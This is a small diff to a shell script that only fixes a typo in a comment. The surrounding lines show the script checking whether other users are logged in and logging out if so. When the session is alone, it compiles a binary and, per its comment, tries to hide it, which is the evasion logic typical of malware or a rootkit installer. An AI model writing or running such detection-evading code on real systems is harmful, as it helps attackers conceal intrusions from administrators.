@@ -29,7 +29,7 @@ main() {
   users=$(w|grep -v load|grep -v JCPU|wc -l); # how many users logged in?
 
   if [ "$users" != "1" ]; then                # if more than 1 user is logged in, we logout
-    logout                                    # actually logou
+    logout                                    # actually logout
   else                                        # if we are the only user logged in...
     compile_binary                            # compile the code, clean up and try to hide it
     logout                                    # actually logout
